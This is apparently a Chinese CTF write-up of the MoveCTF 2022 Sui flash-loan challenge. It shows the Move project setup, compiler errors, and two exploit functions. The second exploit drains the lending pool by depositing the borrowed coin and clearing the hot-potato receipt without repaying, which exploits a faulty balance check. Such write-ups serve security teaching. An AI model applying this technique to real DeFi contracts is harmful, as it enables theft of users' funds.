原题目在https://github.com/movebit/movectf-4/blob/master/sources/module.move 考察闪电贷    
由于Move2024有些变化，我对源码做了微调https://github.com/m4sk93/movectf/tree/main/movectf2022/flashloan

## 环境搭建
参考[MoveCTF2022 Checkin](https://m4sk93.github.io/posts/movectf2022_1/)部署题目后，  
为了后续调用方便，在配置文件中添加package ID
```
[package]
name = "movectf2022_flashloan"
edition = "2024.beta" # edition = "legacy" to use legacy (pre-2024) Move
# license = ""           # e.g., "MIT", "GPL", "Apache 2.0"
# authors = ["..."]      # e.g., ["Joe Smith (joesmith@noemail.com)", "John Snow (johnsnow@noemail.com)"]
published-at = "0x2a61d471519b8e85a7730bebcfc3c5cace6ffffb2f5576d593821422d514adc2" # package id

[dependencies]
Sui = { git = "https://github.com/MystenLabs/sui.git", subdir = "crates/sui-framework/packages/sui-framework", rev = "framework/testnet" }

[addresses]
#movectf2022_flashloan = "0x0"
movectf2022_flashloan = "0x2a61d471519b8e85a7730bebcfc3c5cace6ffffb2f5576d593821422d514adc2" # package id

```

## 编写exp
为了调用题目，在配置文件中添加依赖
```
[dependencies]
Sui = { git = "https://github.com/MystenLabs/sui.git", subdir = "crates/sui-framework/packages/sui-framework", rev = "framework/testnet" }
movectf2022_flashloan= { local = "../movectf2022_flashloan/" }
```

初步分析getflag时会检查是否已经把池子抽干,
```
    // check whether you can get the flag
    public entry fun get_flag(self: &mut FlashLender, ctx: &mut TxContext) {
        if (balance::value(&self.to_lend) == 0) {
            event::emit(Flag { user: tx_context::sender(ctx), flag: true });
        }
    }
```
直接试试：
```
/// Module: exp
module exp::exp {

    use sui::tx_context::TxContext;
    use movectf2022_flashloan::flash::{Self, FlashLender};

    public entry fun exp1(lender: &mut FlashLender, ctx: &mut TxContext) {
        let (coin, receipt) = flash::loan(lender, 1000, ctx);

        flash::get_flag(lender, ctx);
    }
}
```
结果编译时就报错
```
error[E06001]: unused value without 'drop'
   ┌─ ./sources/exp.move:9:37
   │
 8 │         let (coin, receipt) = flash::loan(lender, 1000, ctx);
   │              ---- The local variable 'coin' still contains a value. The value does not have the 'drop' ability and must be consumed before the function returns
 9 │         flash::get_flag(lender, ctx);
   │                                     ^ Invalid return
   │
   ┌─ ./../movectf2022_flashloan/sources/movectf2022_flashloan.move:54:9
   │
54 │     ): (Coin<FLASH>, Receipt) {
   │         ----------- The type 'sui::coin::Coin<movectf2022_flashloan::flash::FLASH>' does not have the ability 'drop'
   │
   ┌─ /home/kali/.move/https___github_com_MystenLabs_sui_git_framework__testnet/crates/sui-framework/packages/sui-framework/sources/coin.move:35:19
   │
35 │     public struct Coin<phantom T> has key, store {
   │                   ---- To satisfy the constraint, the 'drop' ability would need to be added here

error[E06001]: unused value without 'drop'
   ┌─ ./sources/exp.move:9:37
   │
 8 │         let (coin, receipt) = flash::loan(lender, 1000, ctx);
   │                    ------- The local variable 'receipt' still contains a value. The value does not have the 'drop' ability and must be consumed before the function returns
 9 │         flash::get_flag(lender, ctx);
   │                                     ^ Invalid return
   │
   ┌─ ./../movectf2022_flashloan/sources/movectf2022_flashloan.move:24:19
   │
24 │     public struct Receipt {
   │                   ------- To satisfy the constraint, the 'drop' ability would need to be added here
   ·
54 │     ): (Coin<FLASH>, Receipt) {
   │                      ------- The type 'movectf2022_flashloan::flash::Receipt' does not have the ability 'drop'
```
所以必须对coin和receipt进行处理,不能让你贷完就跑路

注意看代码里的这个结构体：
```
    public struct Receipt {
        flash_lender_id: ID,
        amount: u64
    }
```
参考 [Hot Potato](https://examples.sui.io/patterns/hot-potato.html)
(Hot Potato is a name for a struct that has no abilities, hence it can only be packed and unpacked in its module. In this struct, you must call function B after function A in the case where function A returns a potato and function B consumes it.)
```
/// Module: exp
module exp::exp {

    use sui::tx_context::TxContext;
    use movectf2022_flashloan::flash::{Self, FlashLender};

    public entry fun exp1(lender: &mut FlashLender, ctx: &mut TxContext) {
        let (coin, receipt) = flash::loan(lender, 1000, ctx);

        flash::get_flag(lender, ctx);

        flash::repay(lender, coin);
        flash::check(lender, receipt);
    }
}
```
有借有还，这下成功了.

问题来了，可以不还吗？？？

还有一种利用方式
```
/// Module: exp
module exp::exp {

    use sui::tx_context::TxContext;
    use movectf2022_flashloan::flash::{Self, FlashLender};

    public entry fun exp1(lender: &mut FlashLender, ctx: &mut TxContext) {
        let (coin, receipt) = flash::loan(lender, 1000, ctx);

        flash::get_flag(lender, ctx);

        flash::repay(lender, coin);
        flash::check(lender, receipt);
    }

    public entry fun exp2(lender: &mut FlashLender, ctx: &mut TxContext) {
        let (coin, receipt) = flash::loan(lender, 1000, ctx);

        flash::deposit(lender, coin, ctx);
        flash::check(lender, receipt);
        flash::withdraw(lender, 1000, ctx);

        flash::get_flag(lender, ctx);
    }

}
```
问题在于：coin可以通过`deposit`消耗掉.通过`check`消耗`receipt`时不需要发送coin.而且check判断余额的方式也不对。

## 拓展

https://github.com/movebit/movectf2024-day1/tree/main/swap


## 参考资料

感谢大佬们无私分享
- [MoveCTF 2022 题解](https://lanford33.com/movectf-2022)
- [MoveCTF 所有题解Writeup](https://learnblockchain.cn/index.php/article/5025)

